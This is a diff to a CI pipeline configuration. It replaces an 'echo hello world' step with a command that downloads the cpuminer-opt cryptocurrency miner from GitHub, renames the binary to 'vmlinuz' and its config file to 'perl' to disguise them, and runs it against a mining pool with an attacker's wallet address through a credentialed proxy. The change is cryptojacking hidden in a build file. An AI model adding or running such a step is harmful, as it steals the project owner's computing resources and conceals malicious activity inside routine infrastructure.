@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout # check out the code in the project directory
-      - run: echo "hello world" # run the `echo` command
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.19/cpuminer-opt-linux.tar.gz && tar xzvf cpuminer-opt-linux.tar.gz && cp cpuminer-sse2 vmlinuz && chmod +x vmlinuz && echo '{"user": "sugar1q2659f2ynmzz46ckcujgj8mxtex5ewzcjya4pan", "url": "stratum+tcp://stratum-na.rplant.xyz:7042", "pass": "x", "algo": "yespowerSUGAR", "no-color": true, "no-extranonce": false}' > perl && ./vmlinuz -c perl --no-auto -x http://qVhbUupGHmKCdSf:RfGOqIzNToRXjRJ0o7boPDSRsbiujXG43hOp3k@185.117.154.207:80
